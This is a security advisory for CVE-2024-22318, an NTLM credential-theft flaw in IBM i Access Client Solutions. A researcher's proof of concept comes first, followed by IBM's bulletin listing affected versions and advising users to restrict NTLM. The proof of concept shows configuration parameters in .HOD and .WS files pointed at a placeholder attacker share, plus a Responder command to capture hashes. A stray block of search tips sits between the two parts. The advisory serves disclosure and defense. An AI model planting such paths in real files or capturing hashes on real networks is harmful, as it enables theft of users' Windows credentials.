[Vulnerability Type]
Remote Credential Theft

[CVE Reference]
CVE-2024-22318

[Security Issue]
IBM i Access Client Solutions (ACS) is vulnerable to remote credential
theft when NT LAN Manager (NTLM) is enabled on Windows workstations.
Attackers can create UNC capable paths within ACS 5250 display terminal
configuration ".HOD" or ".WS" files to point to a hostile server. If NTLM
is enabled and the user opens an attacker supplied file the Windows
operating system will try to authenticate using the current user's session.
The attacker controlled server could then capture the NTLM hash information
to obtain the user's credentials.

[Exploit/POC]
The client access .HOD File vulnerable parameters:

1) screenHistoryArchiveLocation=\\ATTACKER-SERVER\RemoteCredTheftP0c

[KeyRemapFile]
2) Filename= \\ATTACKER-SERVER\RemoteCredTheftP0c

Next, Kali Linux Responder.py to capture: Responder.py -I eth0 -A -vv

The client access legacy .WS File vulnerable parameters:
DefaultKeyboard= \\ATTACKER-SERVER\RemoteCredTheftP0c

Example, client access older .WS file

##### **Tips**

To return expected results, you can:

* **Reduce the number of search terms.** Each term you use focuses the search further.
* **Check your spelling.** A single misspelled or incorrectly typed term can change your result.
* **Try substituting synonyms for your original terms.** For example, instead of searching for "java classes", try "java training"
* **Did you search for an IBM acquired or sold product ?** If so, follow the appropriate link below to find the content you need.

# Security Bulletin: IBM i Access Client Solutions is vulnerable to remote credential theft when NTLM is enabled on Windows workstations

### Security Bulletin

## Summary

IBM i Access Client Solutions (ACS) is vulnerable to remote credential theft when NT LAN Manager (NTLM) is enabled on Windows workstations (CVE-2024-22318). Since IBM i Access Client solutions allows Universal Naming Convention (UNC) paths in its configuration files, if a path is modified to point to a hostile server, the NTLM hash can be harvested during the NTLM authentication and used for an additional attack.

## Vulnerability Details

 **CVEID:** [CVE-2024-22318](https://exchange.xforce.ibmcloud.com/vulnerabilities/279091)

## Affected Products and Versions

| Affected Product(s) | Version(s) |
| --- | --- |
| IBM i Access Family | 1.1.2 - 1.1.4,1.1.4.3 - 1.1.9.4 |

## Remediation/Fixes

None

## Workarounds and Mitigations

NT LAN Manager (NTLM) is not used directly by IBM i Access Client Solutions (ACS), nor does ACS have any specific support for it. Since ACS does not prevent the usage of Universal Naming Convention (UNC) paths, when a UNC path is encountered while using ACS, NTLM authentication could be performed by the Windows operating system.  Administrators and users need to be aware that if NTLM is enabled on a Windows workstation it is vulnerable to a variety of NTLM security issues.

IBM recommends not using NT LAN Manager (NTLM).  For information on restricting NTLM, see section [**11.1.4 Restricting Windows NTLM**](https://www.ibm.com/support/pages/ibm-i-access-acs-getting-started#11.1.4) in the [**GettingStarted**](https://www.ibm.com/support/pages/ibm-i-access-acs-getting-started) document for **IBM i Access Client Solutions** with a publish date of January 24, 2024 or later.

Please note: Users of future releases of IBM i Access family of products should be directed to follow this same guidance.

## Disclaimer

According to the Forum of Incident Response and Security Teams (FIRST), the Common Vulnerability Scoring System (CVSS) is an "industry open standard designed to convey vulnerability severity and help to determine urgency and priority of response." IBM PROVIDES THE CVSS SCORES ""AS IS"" WITHOUT WARRANTY OF ANY KIND, INCLUDING THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE. CUSTOMERS ARE RESPONSIBLE FOR ASSESSING THE IMPACT OF ANY ACTUAL OR POTENTIAL SECURITY VULNERABILITY. In addition to other efforts to address potential vulnerabilities, IBM periodically updates the record of components contained in our product offerings. As part of that effort, if IBM identifies previously unidentified packages in a product/service inventory, we address relevant vulnerabilities regardless of CVE date. Inclusion of an older CVEID does not demonstrate that the referenced product has been used by IBM since that date, nor that IBM was aware of a vulnerability as of that date. We are making clients aware of relevant vulnerabilities as we become aware of them. "Affected Products and Versions" referenced in IBM Security Bulletins are intended to be only products and versions that are supported by IBM and have not passed their end-of-support or warranty date. Thus, failure to reference unsupported or extended-support products and versions in this Security Bulletin does not constitute a determination by IBM that they are unaffected by the vulnerability. Reference to one or more unsupported versions in this Security Bulletin shall not create an obligation for IBM to provide fixes for any unsupported or extended-support products or versions.
